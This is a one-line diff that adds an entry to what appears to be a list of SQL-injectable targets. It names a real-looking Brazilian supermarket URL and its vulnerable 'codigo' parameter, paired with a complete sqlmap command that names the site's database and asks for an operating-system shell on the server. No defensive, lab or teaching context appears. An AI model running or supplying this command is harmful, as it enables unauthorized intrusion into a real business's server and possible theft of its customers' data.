@@ -1,0 +1,1 @@
+http://www.dbsupermercados.com.br/anexos.php?codigo=23 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.dbsupermercados.com.br/anexos.php?codigo=23 -D dbsupermercados --os-shell
